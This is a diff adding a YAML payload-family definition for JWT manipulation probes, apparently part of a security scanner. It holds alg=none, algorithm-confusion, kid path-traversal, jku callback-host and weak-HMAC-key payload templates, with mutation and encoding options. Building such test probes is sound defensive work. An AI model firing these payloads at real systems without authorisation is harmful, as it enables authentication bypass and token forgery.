@@ -1,0 +1,53 @@
+family_id: jwt
+description: >-
+  JSON-Web-Token manipulation probes covering alg=none, alg confusion,
+  weak HMAC keys, kid path-traversal, and JKU/X5U header tampering.
+  Seeds are header/payload templates; the validator pairs them with a
+  canonical signing helper at request time.
+cwe_ids: [347, 287, 290]
+owasp_top10:
+  - 'A02:2021'
+  - 'A07:2021'
+risk_level: medium
+requires_approval: false
+oast_required: false
+payloads:
+  - id: alg_none_lower
+    template: '{"alg":"none","typ":"JWT"}'
+    confidence: likely
+    notes: alg=none header; classic library-bug bypass (lowercase variant).
+  - id: alg_none_upper
+    template: '{"alg":"None","typ":"JWT"}'
+    confidence: likely
+    notes: Mixed-case None; bypasses naive substring filters on alg=none.
+  - id: alg_confusion_hs256
+    template: '{"alg":"HS256","typ":"JWT","kid":"{canary}"}'
+    confidence: suspected
+    notes: HS256 substituted for RS256; tests key-confusion vulnerable libs.
+  - id: kid_path_traversal
+    template: '{"alg":"HS256","typ":"JWT","kid":"../../../dev/null"}'
+    confidence: suspected
+    notes: Path-traversal kid; tests file-loader-based key resolution.
+  - id: jku_oast
+    template: '{"alg":"RS256","typ":"JWT","jku":"https://{oast_host}/{canary}.json"}'
+    confidence: confirmed
+    notes: jku pointing at OAST JWKS; callback confirms the verifier fetches it.
+  - id: weak_hmac_key
+    template: 'secret'
+    confidence: suspected
+    notes: Weak HMAC key candidate for offline brute-force.
+mutations:
+  - name: case_flip
+    description: Header values are processed case-sensitively by some libs.
+  - name: unicode_homoglyph
+    description: Cyrillic look-alikes in header values; library-quirk research.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw JSON header/claim payload.
+  - name: base64
+    stages: [base64]
+    description: Base64-encoded JWT segment.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded JWT in query string contexts.
